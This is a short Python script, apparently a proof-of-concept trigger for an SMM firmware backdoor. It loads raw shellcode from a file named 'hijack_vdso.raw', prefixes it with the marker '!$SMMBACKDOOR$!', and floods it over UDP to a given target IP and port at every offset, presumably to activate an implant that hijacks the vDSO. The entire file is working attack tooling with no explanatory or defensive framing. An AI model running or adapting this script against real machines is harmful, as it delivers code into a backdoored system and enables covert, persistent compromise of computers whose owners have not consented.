#!/usr/bin/env python3

import socket
import sys

MAGIC = b'!$SMMBACKDOOR$!'
with open('hijack_vdso.raw', 'rb') as fp:
    CODE = fp.read()
MESSAGE = MAGIC + CODE

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: %s <ip> <port>' % sys.argv[0])
        sys.exit(1)

    target = sys.argv[1], int(sys.argv[2])
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        for i in range(0, 4096-len(MESSAGE)):
            data = (b'x' * i) + MESSAGE
            sock.sendto(data, target)

    sock.close()
